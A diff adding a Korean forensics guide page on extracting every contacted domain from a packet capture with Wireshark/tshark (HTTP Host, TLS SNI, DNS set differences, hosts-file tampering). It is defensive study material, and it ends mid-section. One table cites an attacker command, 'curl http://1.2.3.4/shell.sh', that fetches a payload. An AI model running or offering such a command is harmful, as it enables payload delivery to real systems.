@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>http.host 필터로 접속 도메인 전부 뽑기: 가상 호스트·IP 직접 접속·DNS 없는 Host · FOR-0160 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=Network%2FPCAP">Network/PCAP</a> / FOR-0160
+      </div>
+      <header class="article-head">
+        <h1>http.host 필터로 접속 도메인 전부 뽑기: 가상 호스트·IP 직접 접속·DNS 없는 Host</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">Network/PCAP</span>
+      <span class="badge badge-type">가이드</span>
+      <span class="badge badge-diff diff-intermediate">중급</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">windows</span>
+      <span class="chip">linux</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>http.host는 IP가 아니라 클라이언트가 &quot;가려고 한 이름&quot; 이다. 빈도표로 전체 도메인을 뽑고, TLS의 SNI(tls.handshake.extensions_server_name)와 합쳐 HTTP/HTTPS 목록을 하나로 만든 뒤, DNS 질의 집합과 차집합을 내면 hosts 파일·직접 IP 접속·하드코딩 C2가 즉시 드러난다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>Wireshark, tshark</td></tr>
+<tr><th>artifact</th><td><code>pcap</code> · <code>pcapng</code> · <code>Host header</code> · <code>TLS SNI</code> · <code>hosts file</code></td></tr>
+<tr><th>파일 경로</th><td><code>C:\Windows\System32\drivers\etc\hosts</code> · <code>/etc/hosts</code></td></tr>
+<tr><th>프로토콜</th><td>HTTP, TLS, DNS, TCP</td></tr>
+<tr><th>Wireshark 필터</th><td><code>http.host</code> · <code>http.host == &quot;shop.example.com&quot;</code> · <code>http.host contains &quot;example&quot;</code> · <code>http.host matches &quot;^[0-9.]+$&quot;</code> · <code>http.host matches &quot;^[0-9.]+(:[0-9]+)?$&quot;</code> · <code>!http.host &amp;&amp; http.request</code> · <code>http.host &amp;&amp; !(http.host matches &quot;example\\.com$&quot;)</code> · <code>tls.handshake.extensions_server_name</code> · <code>dns.qry.name</code> · <code>http.host matches &quot;\\.(tk|top|xyz|gq)$&quot;</code></td></tr>
+<tr><th>tshark field</th><td><code>http.host</code> · <code>http.request.uri</code> · <code>http.request.full_uri</code> · <code>ip.dst</code> · <code>tcp.dstport</code> · <code>tls.handshake.extensions_server_name</code> · <code>dns.qry.name</code> · <code>dns.a</code> · <code>dns.cname</code> · <code>frame.time_epoch</code></td></tr>
+<tr><th>regex</th><td><code>^\d{1,3}(\.\d{1,3}){3}(:\d+)?$</code> · <code>(?i)\.(tk|top|xyz|gq|cf|ml|zip|mov)$</code></td></tr>
+<tr><th>파일 형식</th><td><code>pcap</code> · <code>pcapng</code></td></tr>
+<tr><th>검색 별칭</th><td>host 필터 · 접속한 도메인 목록 · 어디에 접속했나 · 도메인 전부 뽑기 · sni 확인 · host 헤더 보기 · c2 도메인 찾기</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p><code>http.host</code>는 <strong>IP가 아니라 클라이언트가 &quot;가려고 한 이름&quot;</strong> 이다. 빈도표로 전체 도메인을 뽑고, TLS의 SNI(<code>tls.handshake.extensions_server_name</code>)와 합쳐 HTTP/HTTPS 목록을 하나로 만든 뒤, <strong>DNS 질의 집합과 차집합을 내면 hosts 파일·직접 IP 접속·하드코딩 C2가 즉시 드러난다.</strong></p>
+<h2 id="어떤-문제에서-필요한가">어떤 문제에서 필요한가</h2>
+<ul><li>&quot;피해 PC가 접속한 모든 도메인을 나열하라&quot;</li><li>&quot;C2 서버의 도메인을 구하라&quot;</li><li>&quot;같은 IP에서 여러 사이트가 서비스되는데 어느 사이트로 갔는가&quot;</li><li>&quot;악성 다운로드의 출처 도메인을 특정하라&quot;</li><li>&quot;브라우저 History와 실제 트래픽이 일치하는가&quot;</li><li>&quot;DNS 로그에는 없는 접속이 있는가&quot;</li></ul>
+<p><strong>IP만으로는 답이 안 되는 문제가 많다.</strong> 하나의 IP가 수백 개 도메인을 호스팅하는 CDN·공유 호스팅 환경에서 <code>ip.dst</code>는 정보량이 거의 없다. Host 헤더가 진짜 목적지다.</p>
+<h2 id="문제에서-처음-볼-단서">문제에서 처음 볼 단서</h2>
+<ol><li>Protocol Hierarchy에 HTTP가 있다 → Host 헤더가 평문으로 남아 있다</li><li><code>Statistics &gt; Endpoints &gt; IPv4</code>에 외부 IP가 몇 개뿐인데 요청은 수백 건 → <strong>가상 호스트가 섞여 있다</strong></li><li><code>Info</code> 컬럼에 <code>GET / HTTP/1.1</code>만 반복 → 경로가 아니라 Host로 구분해야 한다</li><li>DNS 질의는 5건인데 접속한 도메인이 8개 → <strong>3개는 DNS 없이 접속했다</strong></li><li>지문에 &quot;도메인&quot;, &quot;사이트&quot;, &quot;C2&quot;, &quot;명령제어&quot;, &quot;출처&quot;</li></ol>
+<h2 id="30초-절차">30초 절차</h2>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">tshark -r capture.pcapng -Y http.request -T fields -e http.host | sort | uniq -c | sort -nr</code></pre></div>
+<p>GUI라면 필터를 걸고 컬럼을 올린다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">http.request</code></pre></div>
+<p><code>http.host</code> 필드 우클릭 → <code>Apply as Column</code> → 컬럼 헤더 클릭으로 정렬. 또는 통계 창으로:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">Statistics &gt; HTTP &gt; Requests</code></pre></div>
+<p>이 창이 <strong>호스트별 URI 트리</strong>를 그대로 보여준다. 도메인 목록이 필요할 때 가장 빠른 GUI 경로다.</p>
+<p>IP를 Host로 쓴 요청만 즉시 골라내기:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">http.host matches &quot;^[0-9.]+(:[0-9]+)?$&quot;</code></pre></div>
+<h2 id="상세-절차">상세 절차</h2>
+<h3 id="1단계-host-헤더가-무엇을-결정하는가">1단계 — Host 헤더가 무엇을 결정하는가</h3>
+<p>하나의 IP·하나의 포트에서 여러 사이트를 서비스하는 것이 <strong>가상 호스트(virtual host)</strong> 다. 서버는 TCP 연결만으로는 어느 사이트인지 알 수 없고, <strong>요청의 <code>Host</code> 헤더를 보고 갈라낸다.</strong></p>
+<div class="table-wrap"><table><thead><tr><th>요청</th><th><code>ip.dst</code></th><th><code>http.host</code></th><th>서버가 응답하는 사이트</th></tr></thead><tbody><tr><td><code>GET / HTTP/1.1</code> + <code>Host: shop.example.com</code></td><td>93.184.216.34</td><td><code>shop.example.com</code></td><td>쇼핑몰</td></tr><tr><td><code>GET / HTTP/1.1</code> + <code>Host: blog.example.com</code></td><td>93.184.216.34</td><td><code>blog.example.com</code></td><td>블로그</td></tr><tr><td><code>GET / HTTP/1.1</code> + <code>Host: 93.184.216.34</code></td><td>93.184.216.34</td><td><code>93.184.216.34</code></td><td>기본 사이트(default vhost)</td></tr></tbody></table></div>
+<p><strong>세 요청의 IP·포트·URI가 모두 같지만 서로 다른 사이트다.</strong> 그래서 <code>ip.dst == 93.184.216.34</code> 로는 문제를 풀 수 없다.</p>
+<p>HTTP/1.1에서 <code>Host</code>는 필수 헤더다. 없으면 서버는 <code>400 Bad Request</code>로 응답해야 한다. 따라서:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">http.request &amp;&amp; !http.host</code></pre></div>
+<p>이 필터에 걸린 요청은 <strong>HTTP/1.0 클라이언트이거나, 헤더를 직접 조립한 스크립트/도구다.</strong> 그 자체가 이상 신호다.</p>
+<h3 id="2단계-접속-도메인-전체-목록을-빈도순으로">2단계 — 접속 도메인 전체 목록을 빈도순으로</h3>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># HTTP Host 빈도표
+tshark -r capture.pcapng -Y &#39;http.request&#39; -T fields -e http.host |
+  sort | uniq -c | sort -nr</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">    412 shop.example.com
+     97 cdn.example.com
+     31 api.example.com
+     14 www.google-analytics.com
+      6 update.microsoft.com
+      3 cdn-static-7f2a.top
+      2 10.0.0.250
+      1 192.168.56.101:8080</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>관찰</th><th>해석</th></tr></thead><tbody><tr><td>상위 = 본 사이트와 CDN·분석 스크립트</td><td>정상 배경</td></tr><tr><td><strong>하위(1~3회) 도메인</strong></td><td>특이 접속. <strong>여기에 답이 있다</strong></td></tr><tr><td><code>.top</code> <code>.xyz</code> <code>.tk</code> <code>.gq</code> <code>.cf</code> <code>.ml</code> 같은 저가 TLD</td><td>악성 인프라에서 흔하다</td></tr><tr><td>무작위 문자열이 섞인 서브도메인 (<code>cdn-static-7f2a</code>)</td><td>DGA/위장 도메인 후보</td></tr><tr><td><strong>Host가 IP</strong></td><td>이름 없이 직접 접속. <strong>강한 의심 신호</strong></td></tr><tr><td>Host에 포트가 붙어 있다 (<code>host:8080</code>)</td><td>비표준 포트 서비스</td></tr><tr><td>내부 이름(<code>10.0.0.250</code>, <code>srv-file01</code>)</td><td>내부 이동(lateral movement)</td></tr></tbody></table></div>
+<p>Host + URI를 함께 집계하면 각 도메인에서 무엇을 했는지 한 표에 나온다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">tshark -r capture.pcapng -Y &#39;http.request&#39; \
+  -T fields -e http.host -e http.request.method -e http.request.uri |
+  sort | uniq -c | sort -nr | head -40</code></pre></div>
+<p>특정 도메인만 파고들 때:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">http.host == &quot;cdn-static-7f2a.top&quot;
+http.host contains &quot;7f2a&quot;
+http.host matches &quot;\\.(tk|top|xyz|gq|cf|ml)$&quot;</code></pre></div>
+<p><strong>정상 도메인을 제외해 남는 것만 보는 전략</strong>이 가장 효율적이다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">http.request &amp;&amp; !(http.host matches &quot;(example\\.com|microsoft\\.com|google(-analytics)?\\.com|windowsupdate\\.com)$&quot;)</code></pre></div>
+<h3 id="3단계-host가-ip인-요청-도메인-없이-직접-접속">3단계 — Host가 IP인 요청: 도메인 없이 직접 접속</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">http.host matches &quot;^[0-9.]+(:[0-9]+)?$&quot;</code></pre></div>
+<p>IPv6까지 포함하려면 콜론이 들어간 형태도 봐야 하므로, 더 단순하게 &quot;점과 숫자와 콜론만으로 이루어진 Host&quot;를 잡는다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">http.host matches &quot;^[0-9a-fA-F:.\\[\\]]+(:[0-9]+)?$&quot;</code></pre></div>
+<p><strong>왜 의심스러운가.</strong> 사람이 브라우저로 사이트를 방문하면 도메인 이름을 쓴다. Host가 IP라는 것은 다음 중 하나다.</p>
+<div class="table-wrap"><table><thead><tr><th>경우</th><th>판정</th></tr></thead><tbody><tr><td>멀웨어가 IP를 하드코딩해 비컨을 보낸다</td><td><strong>악성. 도메인 등록·DNS 로그를 우회하려는 의도</strong></td></tr><tr><td>공격자가 <code>curl http://1.2.3.4/shell.sh</code> 로 페이로드를 받는다</td><td><strong>악성</strong></td></tr><tr><td>내부 관리 인터페이스 직접 접속 (<code>http://10.0.0.250</code>)</td><td>정상일 수 있으나 내부 이동 확인 필요</td></tr><tr><td>스캐너가 IP 범위를 훑는다</td><td>정찰</td></tr><tr><td>프린터·NAS·라우터 등 장비의 자체 갱신</td><td>정상 배경</td></tr></tbody></table></div>
+<p>동일한 확인을 TLS 측에서도 한다. <strong>SNI 없이 IP로 붙는 TLS 연결</strong>은 같은 의미의 신호다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">tls.handshake.type == 1 &amp;&amp; !tls.handshake.extensions_server_name</code></pre></div>
+<h3 id="4단계-비정상-host-판정-기준">4단계 — 비정상 Host 판정 기준</h3>
+<div class="table-wrap"><table><thead><tr><th>패턴</th><th>예</th><th>왜 이상한가</th></tr></thead><tbody><tr><td>내부 호스트명</td><td><code>srv-file01</code>, <code>dc01.corp.local</code></td><td>외부 캡처 구간에 나올 이유가 없다. 내부 이동 흔적</td></tr><tr><td>오타 도메인(typosquatting)</td><td><code>micros0ft.com</code>, <code>goggle.com</code>, <code>exarnple.com</code></td><td>피싱/워터링홀. <strong>문자 치환(o↔0, l↔1, rn↔m)</strong> 을 눈으로 확인</td></tr><tr><td>정상 도메인 + 낯선 서브도메인</td><td><code>update.microsoft.com.evil.tld</code></td><td><strong>마지막 두 레이블이 진짜 소유자다.</strong> 앞부분은 위장</td></tr><tr><td>하이픈·숫자 뒤범벅 서브도메인</td><td><code>a7f2b91c3d.cdn-node.xyz</code></td><td>DGA(도메인 생성 알고리즘) 후보</td></tr><tr><td>Punycode</td><td><code>xn--pple-43d.com</code></td><td>유니코드 유사 문자 피싱. <strong>디코딩해서 확인</strong></td></tr><tr><td>긴 Base32/Base64 서브도메인</td><td><code>MFRGG2LOF4.tunnel.tld</code></td><td>DNS 터널링과 같은 계열의 데이터 은닉</td></tr><tr><td>Host와 실제 IP의 불일치</td><td><code>Host: www.naver.com</code> → <code>ip.dst</code> 가 사설 IP</td><td><strong>hosts 파일 조작 또는 DNS 스푸핑</strong></td></tr></tbody></table></div>
+<p>마지막 항목을 잡는 방법:</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># Host 와 실제 목적지 IP 를 나란히 놓고 본다
+tshark -r capture.pcapng -Y &#39;http.request&#39; \
+  -T fields -e frame.number -e http.host -e ip.dst -e tcp.dstport |
+  sort -u -k2 | head -40</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">221   shop.example.com    93.184.216.34   80
+1902  www.naver.com       192.168.56.101  80     &lt;-- 유명 도메인이 사설 IP 로 향한다
+2455  cdn-static-7f2a.top 45.155.204.11   80</code></pre></div>
+<p><strong>유명 도메인이 사설/낯선 IP로 향하면 hosts 파일 또는 DNS 응답이 조작된 것이다.</strong></p>
+<h3 id="5단계-dns-질의-없이-나타난-host">5단계 — DNS 질의 없이 나타난 Host</h3>
+<p>정상적인 접속은 <strong>DNS 질의 → 응답 IP → TCP 연결 → Host 헤더</strong> 순서를 밟는다. 이 사슬이 끊긴 곳이 단서다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 1) 접속한 이름 집합 (HTTP Host + TLS SNI)
+{ tshark -r capture.pcapng -Y &#39;http.request&#39; -T fields -e http.host
+  tshark -r capture.pcapng -Y &#39;tls.handshake.extensions_server_name&#39; \
+    -T fields -e tls.handshake.extensions_server_name
+} | tr &#39;A-Z&#39; &#39;a-z&#39; | sed &#39;s/:[0-9]*$//&#39; | grep . | sort -u &gt; names.txt
+
+# 2) DNS 로 질의한 이름 집합
+tshark -r capture.pcapng -Y &#39;dns.flags.response == 0&#39; -T fields -e dns.qry.name |
+  tr &#39;A-Z&#39; &#39;a-z&#39; | grep . | sort -u &gt; dns.txt
+
+# 3) 차집합 — 질의 없이 접속한 이름
+comm -23 names.txt dns.txt</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">10.0.0.250
+cdn-static-7f2a.top
+srv-file01</code></pre></div>
+<p>원인은 셋 중 하나다.</p>
+<div class="table-wrap"><table><thead><tr><th>원인</th><th>근거</th><th>다음 확인</th></tr></thead><tbody><tr><td><strong><code>hosts</code> 파일에 등록되어 있다</strong></td><td>이름 → IP 매핑이 로컬에 있어 질의가 발생하지 않는다</td><td><code>C:\Windows\System32\drivers\etc\hosts</code>, <code>/etc/hosts</code></td></tr><tr><td><strong>DNS 캐시에 이미 있었다</strong></td><td>캡처 시작 전에 질의가 끝났다</td><td><code>ipconfig /displaydns</code>, <code>Get-DnsClientCache</code></td></tr><tr><td><strong>캡처 구간이 질의를 포함하지 않는다</strong></td><td>캡처가 중간부터 시작됐다</td><td><code>Statistics &gt; Capture File Properties</code> 의 시간 범위</td></tr><tr><td>다른 리졸버·암호화 DNS를 썼다</td><td>DoH/DoT(443/853)로 질의해 평문 DNS가 없다</td><td><code>tls</code> 대상 IP가 공개 DoH 서비스인지</td></tr></tbody></table></div>
+<p>반대 방향의 차집합도 의미가 있다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 질의는 했으나 접속하지 않은 이름 — 정찰/실패한 해석
+comm -13 names.txt dns.txt | head -20</code></pre></div>
+<p>디스크 이미지가 함께 주어진 문제라면 hosts 파일을 직접 확인하는 것이 결정적 근거가 된다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">Get-Content &#39;C:\Windows\System32\drivers\etc\hosts&#39; | Where-Object { $_ -notmatch &#39;^\s*#&#39; -and $_ -match &#39;\S&#39; }</code></pre></div>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">grep -vE &#39;^\s*(#|$)&#39; /etc/hosts</code></pre></div>
+<h3 id="6단계-tls-sni와-합쳐-httphttps를-한-목록으로">6단계 — TLS SNI와 합쳐 HTTP/HTTPS를 한 목록으로</h3>
+<p>HTTPS는 본문을 못 봐도 <strong>어디로 갔는지는 평문으로 남는다.</strong> TLS ClientHello의 SNI 확장이 그것이다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">tls.handshake.extensions_server_name
+tls.handshake.extensions_server_name contains &quot;example&quot;</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>프로토콜</th><th>목적지 이름이 담긴 필드</th><th>비고</th></tr></thead><tbody><tr><td>HTTP</td><td><code>http.host</code></td><td>평문. 요청마다 있다</td></tr><tr><td>HTTPS / TLS</td><td><code>tls.handshake.extensions_server_name</code></td><td><strong>ClientHello 에만</strong> 있다. 세션 재개 시 없을 수 있다</td></tr><tr><td>HTTPS 인증서</td><td><code>x509sat.uTF8String</code> 등 인증서 필드</td><td>Subject CN/SAN. TLS 1.3에서는 암호화되어 안 보인다</td></tr><tr><td>QUIC / HTTP3</td><td><code>quic</code> + SNI (복호화 가능 시)</td><td>UDP 443</td></tr><tr><td>DNS</td><td><code>dns.qry.name</code></td><td>이름 해석 시도</td></tr></tbody></table></div>
+<p>통합 목록을 만드는 명령:</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">{ tshark -r capture.pcapng -Y &#39;http.request&#39; -T fields -e frame.time_epoch -e http.host \
+    | awk -F&#39;\t&#39; &#39;{print $1&quot;\tHTTP\t&quot;$2}&#39;
+  tshark -r capture.pcapng -Y &#39;tls.handshake.extensions_server_name&#39; \
+    -T fields -e frame.time_epoch -e tls.handshake.extensions_server_name \
+    | awk -F&#39;\t&#39; &#39;{print $1&quot;\tTLS\t&quot;$2}&#39;
+} | sort -n | head -40</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">1773472502.118   HTTP   shop.example.com
+1773472503.902   TLS    www.google-analytics.com
+1773472561.334   TLS    cdn-static-7f2a.top
+1773472588.771   HTTP   cdn-static-7f2a.top</code></pre></div>
+<p><strong>같은 도메인이 TLS와 HTTP에 모두 나타나면 폴백 또는 이중 채널이다.</strong> 시간순으로 보면 어느 쪽이 먼저였는지, 즉 어느 채널이 주 통로였는지 판정할 수 있다.</p>
+<p>epoch를 사람이 읽는 시각으로:</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">date -u -d @1773472561 &#39;+%Y-%m-%d %H:%M:%S UTC&#39;</code></pre></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">[DateTimeOffset]::FromUnixTimeSeconds(1773472561).UtcDateTime</code></pre></div>
+<p>Unix epoch는 1970-01-01 UTC 기준 초다. KST는 UTC+9이므로 표시된 UTC 시각에 9시간을 더한다.</p>
+<h3 id="7단계-브라우저-history와-대조">7단계 — 브라우저 History와 대조</h3>
+<p>pcap의 Host 목록과 디스크의 브라우저 기록을 맞대면 <strong>&quot;사용자가 직접 방문했는가 / 프로그램이 배후에서 접속했는가&quot;</strong> 가 갈린다.</p>
+<div class="table-wrap"><table><thead><tr><th>pcap의 Host</th><th>브라우저 History</th><th>판정</th></tr></thead><tbody><tr><td>있다</td><td>있다 (typed 전이)</td><td>사용자가 주소창에 직접 입력</td></tr><tr><td>있다</td><td>있다 (link 전이)</td><td>링크 클릭으로 유입. Referer와 일치해야 한다</td></tr><tr><td>있다</td><td><strong>없다</strong></td><td><strong>브라우저가 아닌 프로세스의 접속.</strong> 멀웨어/스크립트/업데이터</td></tr><tr><td>없다</td><td>있다</td><td>캡처 구간 밖의 방문, 또는 캐시로 처리됨</td></tr></tbody></table></div>
+<p>브라우저 기록 읽는 절차는 <a href="./chrome-history.html">FOR-0191</a>에 있다. <code>Referer</code>가 함께 남아 있으면 유입 경로를 이어 붙일 수 있다 (<a href="./http-get-find.html">FOR-0157</a>).</p>
+<h2 id="출력-필드-해석">출력 필드 해석</h2>
+<div class="table-wrap"><table><thead><tr><th>필드</th><th>값의 예</th><th>주의</th></tr></thead><tbody><tr><td><code>http.host</code></td><td><code>shop.example.com</code></td><td><strong>포트가 붙을 수 있다</strong> (<code>host:8080</code>). 비교 시 고려</td></tr><tr><td><code>http.request.full_uri</code></td><td><code>http://shop.example.com/a</code></td><td>Host + URI 합성값</td></tr><tr><td><code>ip.dst</code></td><td><code>93.184.216.34</code></td><td>Host와 다를 수 있다. 불일치가 단서</td></tr><tr><td><code>tcp.dstport</code></td><td><code>80</code>, <code>8080</code></td><td>Host의 포트와 일치하는지 확인</td></tr><tr><td><code>tls.handshake.extensions_server_name</code></td><td><code>www.example.com</code></td><td>ClientHello 에만. <strong>세션 재개 시 없다</strong></td></tr><tr><td><code>dns.qry.name</code></td><td><code>shop.example.com</code></td><td>질의한 이름</td></tr><tr><td><code>dns.a</code></td><td><code>93.184.216.34</code></td><td>응답 A 레코드</td></tr><tr><td><code>dns.cname</code></td><td><code>shop.example.com.cdn.net</code></td><td>CNAME 체인. 최종 이름이 다를 수 있다</td></tr><tr><td><code>frame.time_epoch</code></td><td><code>1773472502.118</code></td><td>1970-01-01 UTC 기준 초</td></tr></tbody></table></div>
+<p>Host 값 비교 시 세 가지를 정규화해야 표가 맞는다.</p>
+<ol><li><strong>대소문자</strong> — 도메인은 대소문자를 구분하지 않는다. <code>Shop.Example.com</code>과 <code>shop.example.com</code>은 같다. 비교 전에 소문자로 변환한다</li><li><strong>포트</strong> — <code>host:8080</code>과 <code>host</code>는 같은 이름이다. <code>sed &#39;s/:[0-9]*$//&#39;</code>로 잘라낸다</li><li><strong>끝의 점</strong> — DNS 질의 이름은 <code>example.com.</code>처럼 루트 점이 붙어 나올 수 있다. <code>sed &#39;s/\.$//&#39;</code></li></ol>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">tshark -r capture.pcapng -Y &#39;http.request&#39; -T fields -e http.host |
+  tr &#39;A-Z&#39; &#39;a-z&#39; | sed -e &#39;s/:[0-9]*$//&#39; -e &#39;s/\.$//&#39; | sort -u</code></pre></div>
+<h2 id="pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>Host에서 얻은 것</th><th>다음 목표</th><th>확인할 것</th></tr></thead><tbody><tr><td>의심 도메인</td><td>그 Host의 모든 요청 (<code>http.host == &quot;...&quot;</code>)</td><td>URI·메서드·전송량</td></tr><tr><td>의심 도메인</td><td>해당 URI 분석 (<a href="./http-request-uri-filter.html">FOR-0159</a>)</td><td>다운로드/명령 경로</td></tr><tr><td>의심 도메인</td><td><code>dns.qry.name == &quot;...&quot;</code> + <code>dns.a</code></td><td>해석된 IP와 TTL</td></tr><tr><td>Host↔IP 불일치</td><td><code>hosts</code> 파일, DNS 캐시</td><td>로컬 조작 여부</td></tr><tr><td>DNS 없는 Host</td><td>디스크의 <code>hosts</code> 파일, 프로세스 목록</td><td>하드코딩 C2</td></tr><tr><td>Host가 IP</td><td>그 IP의 전체 대화 (<code>ip.addr == ...</code>)</td><td>비컨 주기·전송량</td></tr><tr><td>도메인 목록</td><td>브라우저 History (<a href="./chrome-history.html">FOR-0191</a>)</td><td>사용자 방문 vs 배후 접속</td></tr><tr><td>도메인 목록</td><td>서버 접근 로그 (<a href="./powershell-select-string.html">FOR-0121</a>)</td><td>서버 측 기록과 대조</td></tr><tr><td>접속 시각</td><td>그 시각 ±5분의 모든 artifact</td><td>실행·파일 생성과의 인과</td></tr><tr><td>전송량 큰 Host</td><td><code>Statistics &gt; Conversations</code></td><td>유출량 (<a href="./tcp-stream-filter.html">FOR-0164</a>)</td></tr></tbody></table></div>
+<h2 id="흔한-함정">흔한 함정</h2>
+<ul><li><strong><code>ip.dst</code>로 사이트를 판정하는 것.</strong> 하나의 IP가 수백 도메인을 서비스한다(CDN·공유 호스팅). 사이트 판정은 <code>http.host</code> 또는 SNI로 한다.</li><li><strong><code>http.host</code>에 포트가 붙는 것을 잊는 것.</strong> <code>Host: 10.0.0.5:8080</code> 이면 <code>http.host == &quot;10.0.0.5&quot;</code> 는 거짓이다. <code>contains</code> 또는 <code>matches</code>로 쓰거나 포트를 잘라 비교한다.</li><li><strong>대소문자를 구분해 비교하는 것.</strong> 도메인은 대소문자를 구분하지 않지만 <code>contains</code>는 구분한다. <code>matches</code>를 쓰거나 소문자로 정규화한다.</li><li><strong>HTTPS 도메인을 포기하는 것.</strong> 본문은 못 봐도 SNI(<code>tls.handshake.extensions_server_name</code>)는 평문이다. 접속 도메인 목록에서 HTTPS를 빼면 목록이 반쪽이 된다.</li><li><strong>SNI가 없다고 도메인이 없다고 판단하는 것.</strong> TLS 세션 재개(session resumption)나 IP 직접 접속에서는 SNI가 없다. 그 자체가 신호이므로 <code>tls.handshake.type == 1 &amp;&amp; !tls...server_name</code> 으로 따로 센다.</li><li><strong><code>Host: update.microsoft.com.evil.tld</code> 를 마이크로소프트로 읽는 것.</strong> 도메인의 소유자는 <strong>뒤에서 두 번째 레이블부터</strong> 결정된다. 앞부분은 아무나 붙일 수 있다.</li><li><strong>DNS 질의가 없으면 접속이 없었다고 결론내는 것.</strong> hosts 파일, DNS 캐시, 하드코딩 IP, 암호화 DNS(DoH/DoT)로 질의 없이 접속할 수 있다. 차집합을 반드시 낸다.</li><li><strong>빈도표 상위만 보는 것.</strong> C2 비컨은 트래픽이 작아 목록 최하단에 있다. <strong>1~3회 등장한 도메인을 전수로 훑는다.</strong></li><li><strong><code>http.request &amp;&amp; !http.host</code> 를 건너뛰는 것.</strong> HTTP/1.1에서 Host는 필수다. 없는 요청은 직접 조립된 요청이며 그 자체가 이상 신호다.</li><li><strong>오타 도메인을 눈으로 놓치는 것.</strong> <code>rn</code>↔<code>m</code>, <code>0</code>↔<code>o</code>, <code>1</code>↔<code>l</code>, <code>vv</code>↔<code>w</code>. 목록을 알파벳순으로 정렬해 정상 도메인 바로 옆에 오도록 놓으면 잘 보인다.</li><li><strong>Punycode를 디코딩하지 않는 것.</strong> <code>xn--</code>으로 시작하는 Host는 유니코드 도메인이다. 유사 문자 피싱을 판정하려면 디코딩해야 한다.</li><li><strong>시간을 상대 초로 두는 것.</strong> 다른 artifact와 대조하려면 <code>View &gt; Time Display Format &gt; UTC Date and Time of Day</code>가 먼저다. KST = UTC+9.</li></ul>
+<h2 id="교차검증">교차검증</h2>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 1) HTTP Host 고유 목록
+tshark -r capture.pcapng -Y &#39;http.request&#39; -T fields -e http.host |
+  tr &#39;A-Z&#39; &#39;a-z&#39; | sed &#39;s/:[0-9]*$//&#39; | sort -u
+
+# 2) TLS SNI 고유 목록
+tshark -r capture.pcapng -Y &#39;tls.handshake.extensions_server_name&#39; \
+  -T fields -e tls.handshake.extensions_server_name | tr &#39;A-Z&#39; &#39;a-z&#39; | sort -u
+
+# 3) DNS 질의 고유 목록
